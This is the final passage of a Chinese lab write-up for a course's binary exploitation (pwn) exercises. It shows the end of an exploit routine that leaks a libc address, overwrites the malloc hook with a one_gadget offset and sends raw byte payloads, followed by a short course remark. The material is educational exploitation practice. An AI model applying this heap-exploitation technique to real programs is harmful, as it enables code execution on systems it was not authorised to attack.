      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
      1);
  qiaoKe(1);
  daBian(1);
  add(1, -MAIN_ARE_OFF);
  mov(2, 1);
  mov(0, 2);
  add(0, MALLOC_HOOK);

  dianMing("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
           "aaaaaaaaaaaaaaaaa",
           2);
  qiaoKe(2);
  xiaoCe(2);
  mov(0, 2);
  add(0, ONE_GADGET);
  dianMing(
      "\x88\x06H\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
      3);
  xiaoCe(3);
}
```

---

本次二级信安实践 pwn 的几道题内容确实有点多，因此实验完成时间延长到了两周。pwn 里面的内容确实太多了，我们只涉及到了用户态的程序，这也只是 pwn 的冰山一角，希望本次课程能起到抛砖引玉的作用，让同学们熟悉底层的漏洞成因及其利用。

---
